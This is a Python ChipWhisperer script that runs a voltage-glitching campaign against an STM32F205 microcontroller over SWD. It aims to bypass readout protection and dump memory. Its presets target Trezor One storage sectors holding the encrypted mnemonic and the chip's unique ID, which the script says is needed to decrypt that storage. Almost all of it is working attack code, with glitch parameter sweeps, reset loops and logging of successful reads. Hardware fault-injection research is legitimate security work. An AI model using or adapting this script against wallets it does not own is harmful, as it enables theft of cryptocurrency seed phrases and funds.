#!/usr/bin/env python3
"""
Flash Memory Dump via Glitching
Trigger on TIO3 (SWDIO activity)
"""

import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
from swd import Swd
import time
import os
from datetime import datetime
import signal
import sys

# Configuration
ENABLE_GLITCH = True  # Set to True to enable glitching, False to just test SWD reads
ENABLE_RESET = True   # Set to False to disable resets (useful for SRAM testing)
REPEAT_ON_FAILURE = True  # Set to True to restart campaign if no glitches found

# Target memory range - Choose which range to dump
TARGET_RANGE = "UNIQUE_ID"  # Options: "STORAGE", "OPTION_BYTES", "UNIQUE_ID", "OTP", "TEST_UNPROTECTED"

if TARGET_RANGE == "STORAGE":
    # Trezor One storage sectors where encrypted mnemonic is stored
    FLASH_START = 0x08008000  # Start of storage sector 2
    FLASH_END = 0x0800FFFF    # End of storage sector 3 (32KB total)
elif TARGET_RANGE == "OPTION_BYTES":
    # STM32 Option Bytes (contains RDP level, write protection, etc.)
    FLASH_START = 0x1FFFC000  # Start of option bytes
    FLASH_END = 0x1FFFC00F    # End of option bytes (16 bytes)
elif TARGET_RANGE == "UNIQUE_ID":
    # STM32F205 96-bit Unique Device ID (used for SEK derivation)
    # Located in System Memory region
    FLASH_START = 0x1FFF7A10  # Base address of unique ID
    FLASH_END = 0x1FFF7A1B    # 12 bytes (96 bits)
    CHUNK_SIZE = 12           # Read all 12 bytes at once for unique ID
elif TARGET_RANGE == "OTP":
    # One-Time Programmable area (contains additional entropy)
    FLASH_START = 0x1FFF7800  # OTP base
    FLASH_END = 0x1FFF7A0F    # End of OTP area (528 bytes)
elif TARGET_RANGE == "TEST_UNPROTECTED":
    # Unprotected peripheral registers - not affected by RDP
    # Use these to test if glitching is working before attacking protected memory
    FLASH_START = 0xE0042000  # DBGMCU_IDCODE (should return 0x411FC205 for STM32F205)
    FLASH_END = 0xE004200B    # Read 12 bytes to include device ID and revision
    CHUNK_SIZE = 4            # Read 4 bytes at a time for register access
else:
    print(f"Unknown TARGET_RANGE: {TARGET_RANGE}")
    sys.exit(1)

# Set default chunk size if not already set for specific target
if 'CHUNK_SIZE' not in locals():
    CHUNK_SIZE = 32           # Default: Read 32 bytes at a time

def check_memory_read(address):
    """Try to read memory - success means RDP was bypassed"""
    try:
        swd = Swd()
        data = bytes(swd.read_mem(address, CHUNK_SIZE))
        if len(data) == CHUNK_SIZE:
            print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
            print(f"First 16 bytes: ", end="")
            for i in range(min(16, len(data))):
                print(f"{data[i]:02X} ", end="")
            print()
            return data
    except Exception as e:
        print(f" NACK", end="")
    return None

def save_memory_chunk(address, data):
    """Save memory chunk to file"""
    if not os.path.exists('FLASH'):
        os.makedirs('FLASH')

    # Save individual chunk
    filename = f"FLASH/0x{address:08X}.bin"
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"Saved to {filename}")

    # Append to combined file
    combined_file = "FLASH/flash_dump_combined.bin"
    offset = address - FLASH_START

    if not os.path.exists(combined_file):
        with open(combined_file, 'wb') as f:
            f.write(b'\x00' * (FLASH_END - FLASH_START + 1))

    with open(combined_file, 'r+b') as f:
        f.seek(offset)
        f.write(data)

def log_successful_glitch(address, ext_offset, width, offset, attempts, iteration):
    """Log successful glitch to master log file"""
    MASTER_LOG = 'FLASH/glitch_master_log.csv'

    # Create log file with header if it doesn't exist
    if not os.path.exists(MASTER_LOG):
        with open(MASTER_LOG, 'w') as f:
            f.write("Timestamp,Address,ExtOffset,Width,Offset,TimeToFind_sec,Attempts,Iteration,Timing_us\n")

    # Append successful glitch parameters
    with open(MASTER_LOG, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timing_us = ext_offset / 100  # Convert to microseconds
        f.write(f"{timestamp},0x{address:08X},{ext_offset},{width},{offset},0.0,{attempts},{iteration},{timing_us:.1f}\n")
        f.flush()

def log_campaign_loop(campaign_number=1, test_range="", ext_range=""):
    """Log each campaign loop to track repeats"""
    CAMPAIGN_LOG = 'FLASH/campaign_loops.log'

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Append to campaign log with details
    with open(CAMPAIGN_LOG, 'a') as f:
        f.write(f"{timestamp} - Campaign #{campaign_number} - Range: {test_range} - Ext: {ext_range}\n")
        f.flush()

    # Also count total loops
    loop_count = 1
    if os.path.exists(CAMPAIGN_LOG):
        with open(CAMPAIGN_LOG, 'r') as f:
            loop_count = len(f.readlines())

    return loop_count

def cleanup_and_exit(signum=None, frame=None):
    """Gracefully cleanup before exit"""
    print("\n\n⚠️ Interrupt received - cleaning up...")

    try:
        # Ensure TIO2 is low
        scope.io.tio2 = False
        print("✓ TIO2 set low")

        # Ensure nRST is released (high-z)
        scope.io.nrst = 'high_z'
        print("✓ nRST released")

        # Ensure TIO3 is high-z
        scope.io.tio3 = 'high_z'
        print("✓ TIO3 set to high-z")

        # Disconnect scope
        scope.dis()
        print("✓ Scope disconnected")

    except Exception as e:
        print(f"⚠️ Cleanup error: {e}")

    print("✅ Clean exit - SWD should remain intact")
    sys.exit(0)

# Register signal handlers for graceful exit
signal.signal(signal.SIGINT, cleanup_and_exit)  # Ctrl+C
signal.signal(signal.SIGTERM, cleanup_and_exit)  # Kill signal

# Connect to ChipWhisperer
print("="*60)
print("Flash Dump Glitch Campaign - TIO3 Triggered")
print("="*60)

try:
    scope = cw.scope()
except Exception as e:
    print(f"❌ Failed to connect to ChipWhisperer: {e}")
    sys.exit(1)

# Set up scope parameters
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio3'  # Trigger on TIO3 (SWDIO)
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20  # Match the working copy

# Configure TIO3 as input to monitor SWDIO
scope.io.tio3 = 'high_z'
# TIO2 will mark the read operation timing

# Test different timing ranges - CHANGE THIS TO SELECT RANGE
TEST_RANGE = "RANGE2"  # Options: "RANGE1", "RANGE2", "RANGE3"

# Glitch controller setup
# Adjust step size based on range for faster scanning
if TEST_RANGE == "RANGE2":
    g_step = 100  # Steps of 1 microsecond for RANGE2 (much faster)
else:
    g_step = 50  # Steps of 0.1 microseconds for other ranges

gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)

# Glitch parameters from glitch_memory_read_nrst.py
#width_min, width_max = 0.5, 0.5  # Try narrower glitch (between your 0.78 and 1.17 successes)
width_min, width_max = 40, 40  # Try narrower glitch (between your 0.78 and 1.17 successes)
offset_min, offset_max = -45, -45  # Keep your working offset

if TEST_RANGE == "RANGE1":
    # First test: Early timing window
    # Range: 0µs to 150µs (0ms to 0.15ms)
    ext_offset_min, ext_offset_max = 0, 15000
elif TEST_RANGE == "RANGE2":
    # Second test: Later timing window
    # Range: 3,135µs to 23,150µs (3.135ms to 23.15ms)
    ext_offset_min, ext_offset_max = 313500, 2315000
    ext_offset_min, ext_offset_max = 443800, 2315000
    ext_offset_min, ext_offset_max = 1450000, 1480000 
    ext_offset_min, ext_offset_max = 1345000, 1480000
    ext_offset_min, ext_offset_max = 0, 1345000
elif TEST_RANGE == "RANGE3":
    # Third test: Complete coverage
    # Range: 0µs to 23,150µs (0ms to 23.15ms)
    ext_offset_min, ext_offset_max = 0, 2315000
else:
    print(f"Unknown TEST_RANGE: {TEST_RANGE}")
    sys.exit(1)

gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min} to {width_max}")
print(f"  Offset: {offset_min}")
print(f"  Ext_offset: {ext_offset_min/100:.1f}µs to {ext_offset_max/100:.1f}µs")
print(f"  Step: {g_step/100:.1f}µs")
print(f"  Trigger: TIO3 (SWDIO)")

sample_size = 100  # Increased samples for better success rate

print(f"\nTarget: {TARGET_RANGE}")
print(f"Address range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"Total size: {FLASH_END - FLASH_START + 1} bytes")
print(f"Chunk size: {CHUNK_SIZE} bytes")
print(f"Sample size: {sample_size} attempts per setting")
if TARGET_RANGE == "UNIQUE_ID":
    print("\n⚠️  CRITICAL: This 96-bit ID is required to decrypt the storage!")
    print("    Without this, encrypted mnemonic cannot be recovered.")
    print("\n📌 Expected: 12 random bytes, NOT repeating!")
    print("📌 Bad signs: '11 00 77 24' pattern, all zeros, all FFs")
elif TARGET_RANGE == "OPTION_BYTES":
    print("\n📌 Expected: Should start with 0xED (user byte)")
    print("📌 Your device shows: OPTCR = 0x0FFFFFED")
elif TARGET_RANGE == "TEST_UNPROTECTED":
    print("\n✅ TESTING MODE: Unprotected peripheral registers")
    print("📌 Expected DBGMCU_IDCODE: 0x411FC205 (STM32F205)")
    print("📌 This should work even with RDP active")
    print("📌 If this fails, glitch timing needs adjustment")
print("="*60)

print("="*60)

input("\nPress Enter to start (Ctrl+C to exit)...")

# Announce start of campaign
os.system(f"espeak 'Starting glitch campaign for {TARGET_RANGE}.' 2>/dev/null")
print("🔊 Announced start of campaign")

current_address = FLASH_START
total_attempts = 0
campaign_number = 1
overall_success = False

# Main campaign loop with repeat option
while True:
    # Log this campaign loop with details
    ext_range_str = f"{ext_offset_min/100:.1f}-{ext_offset_max/100:.1f}µs"
    loop_count = log_campaign_loop(campaign_number, TEST_RANGE, ext_range_str)

    if campaign_number > 1:
        print(f"\n{'='*60}")
        print(f"🔄 STARTING CAMPAIGN #{campaign_number} (Total loops: {loop_count})")
        os.system(f"espeak 'Starting campaign number {campaign_number}.' 2>/dev/null")
        print(f"{'='*60}")
        print(f"📝 Campaign logged to FLASH/campaign_loops.log")
        current_address = FLASH_START  # Reset to start

    campaign_success = False

    # Glitch campaign loop
    while current_address <= FLASH_END:
        print(f"\n🎯 Target: 0x{current_address:08X}")

        address_found = False

        for glitch_setting in gc.glitch_values():
            scope.glitch.width = glitch_setting[0]
            scope.glitch.offset = glitch_setting[1]
            scope.glitch.ext_offset = glitch_setting[2]

            print(f"Testing ext_offset: {scope.glitch.ext_offset/100:.1f}µs ", end="")

            for i in range(sample_size):
                print(f".", end="", flush=True)

                # Arm scope - will trigger on SWDIO activity
                if ENABLE_GLITCH:
                    scope.arm()

                total_attempts += 1

                # Set TIO2 high to mark start of read operation
                scope.io.tio2 = True

                # Attempt memory read - SWDIO activity will trigger glitch
                data = check_memory_read(current_address)

                # Set TIO2 low to mark end of read operation
                scope.io.tio2 = False

                if data:
                    print(f"\n✅ GLITCH SUCCESS at ext_offset={scope.glitch.ext_offset/100:.1f}µs")
                    save_memory_chunk(current_address, data)
                    # Log the successful glitch parameters
                    log_successful_glitch(current_address, scope.glitch.ext_offset,
                                        scope.glitch.width, scope.glitch.offset,
                                        total_attempts, i+1)
                    print(f"📝 Logged to FLASH/glitch_master_log.csv")
                    current_address += CHUNK_SIZE
                    address_found = True
                    campaign_success = True
                    break

                # Reset after EACH attempt (like the working copy)
                if ENABLE_RESET:
                    scope.io.nrst = False
                    time.sleep(0.1)
                    scope.io.nrst = 'high_z'
                    time.sleep(0.5)

            if address_found:
                break
            else:
                print(" Failed")

        if not address_found:
            print(f"⚠️ Failed to glitch 0x{current_address:08X}, skipping")
            current_address += CHUNK_SIZE

    # Check if campaign was successful or should repeat
    if campaign_success:
        overall_success = True
        print(f"\n🎉 Campaign #{campaign_number} SUCCESSFUL! Found glitch(es)!")
        print(f"📊 Total loops run: {loop_count}")
        break
    else:
        print(f"\n❌ Campaign #{campaign_number} complete - No glitches found")
        print(f"Total attempts this campaign: {total_attempts}")
        print(f"📊 Total loops so far: {loop_count}")

        if not REPEAT_ON_FAILURE:
            print("REPEAT_ON_FAILURE is False - Exiting")
            break

        campaign_number += 1
        print(f"\n🔄 Preparing for campaign #{campaign_number}...")
        print(f"📝 Logging campaign loop to FLASH/campaign_loops.log")
        time.sleep(2)

print("\n" + "="*60)
if overall_success:
    print("🎉 GLITCH CAMPAIGN SUCCESSFUL!")
else:
    print("Campaign complete - No glitches found")
print(f"Total campaigns run: {campaign_number}")
print(f"Total attempts: {total_attempts}")
print(f"📊 Total historical loops: {loop_count}")
print(f"📝 Campaign history: FLASH/campaign_loops.log")
print("="*60)

# Continuous alert with progressive delays
print("\n🔊 CAMPAIGN COMPLETE - Press Ctrl+C to stop alert")
start_time = time.time()
announcement_count = 0

while True:
    os.system("espeak 'Campaign complete. Press control C to stop.' 2>/dev/null")
    announcement_count += 1

    elapsed_minutes = (time.time() - start_time) / 60

    if elapsed_minutes < 5:
        # First 5 minutes: announce every minute
        time.sleep(60)
    else:
        # After 5 minutes: announce every 5 minutes
        time.sleep(300)

# Clean exit at end of script (won't reach here due to loop)
cleanup_and_exit()